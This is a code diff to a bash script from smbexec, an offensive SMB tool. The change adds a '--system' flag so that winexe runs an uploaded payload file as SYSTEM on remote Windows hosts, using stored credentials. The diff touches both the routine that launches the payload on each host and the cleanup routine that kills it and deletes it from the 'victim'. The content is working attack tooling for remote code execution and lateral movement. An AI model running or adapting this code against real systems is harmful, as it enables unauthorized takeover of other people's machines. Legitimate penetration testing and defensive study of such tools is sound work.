@@ -988,20 +988,20 @@ f_getsome(){
 			echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
 			if [ "$isadmin" == "1" ]; then
 				ADMINPATH=$prepath$RPATH
-				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			else
-				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			echo $! > /tmp/smbexec/winexe.pid #grab the pid so we can kill it
@@ -1044,16 +1044,16 @@ f_cleanup(){
 			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C taskkill /IM $SMBFilename /F" &> /tmp/smbexec/error.jnk
 			echo -e "\n\e[1;33mRemoving the file from the victim, please standby\e[0m"
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ "$isadmin" == "1" ]; then
-				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
 			else
-				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			fi
 		done
 	else
